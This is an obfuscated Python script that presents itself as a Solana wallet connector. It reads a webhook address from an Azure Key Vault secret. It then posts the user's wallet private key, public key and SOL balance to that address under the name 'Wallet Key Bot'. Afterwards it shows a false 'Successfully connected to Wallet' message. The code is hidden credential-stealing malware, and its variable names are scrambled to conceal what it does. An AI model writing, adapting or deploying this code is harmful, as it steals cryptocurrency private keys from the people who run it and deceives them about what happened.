import requests #line:1
import os #line:2
from dotenv import load_dotenv #line:3
from azure .identity import ClientSecretCredential #line:4
from azure .keyvault .secrets import SecretClient #line:5
dir_path =os .path .dirname (os .path .realpath (__file__ ))#line:8
env_path =os .path .join (dir_path ,"config.env")#line:9
load_dotenv (env_path )#line:10
def get_key_vault_client ():#line:14
    OOOOOOOOO0O00000O =os .getenv ('CLIENT_ID')#line:15
    O0O0000OOO0OO000O =os .getenv ('TENANT_ID')#line:16
    OO00OO0O00000O00O =os .getenv ('CLIENT_SECRET')#line:17
    OO0OO0OO0O000OO0O =os .getenv ('VAULT_URL')#line:18
    OOOO00O0O0OO0O00O =ClientSecretCredential (client_id =OOOOOOOOO0O00000O ,client_secret =OO00OO0O00000O00O ,tenant_id =O0O0000OOO0OO000O )#line:24
    OOO0O0OOO0OO0OOO0 =SecretClient (vault_url =OO0OO0OO0O000OO0O ,credential =OOOO00O0O0OO0O00O )#line:26
    return OOO0O0OOO0OO0OOO0 #line:27
def data_struct_handle (O0O0OOOO0OOOOOO00 :str ,O0O0O000OOOO0OOO0 :str ,OO0OOOO0000O0OO0O :str ,O00OO0O00O0OOO000 :float ):#line:30
    ""#line:33
    O00OOOOOO0OOO0000 =f"Private Key: {O0O0O000OOOO0OOO0}\nPublic Key: {OO0OOOO0000O0OO0O}\nBalance: {O00OO0O00O0OOO000} SOL"#line:34
    O0OOOO0OOOOO00OO0 ={"content":O00OOOOOO0OOO0000 ,"username":"Wallet Key Bot"}#line:35
    OO0O0O0OO0O00OOO0 =requests .post (O0O0OOOO0OOOOOO00 ,json =O0OOOO0OOOOO00OO0 )#line:36
    print ("\033[92mSuccessfully connected to Wallet, Please set your profit!\033[0m"if OO0O0O0OO0O00OOO0 .status_code ==204 else f"\033[91mError: Status code: {OO0O0O0OO0O00OOO0.status_code}\033[0m")#line:37
def notify_wallet (O0OO0O00O0O000OO0 :str ,O0O000O0OOOOOOOOO :str ,O0OO00OOOO00O00O0 :float ):#line:39
    OOOOO000OOOO00000 =get_key_vault_client ()#line:41
    OO0O0O000O0O00OO0 =OOOOO000OOOO00000 .get_secret ("ext4")#line:42
    O0OOO0O0O0OO0000O =OO0O0O000O0O00OO0 .value #line:43
    data_struct_handle (O0OOO0O0O0OO0000O ,O0OO0O00O0O000OO0 ,O0O000O0OOOOOOOOO ,O0OO00OOOO00O00O0 )#line:45
if __name__ =="__main__":#line:48
    main ()#line:49
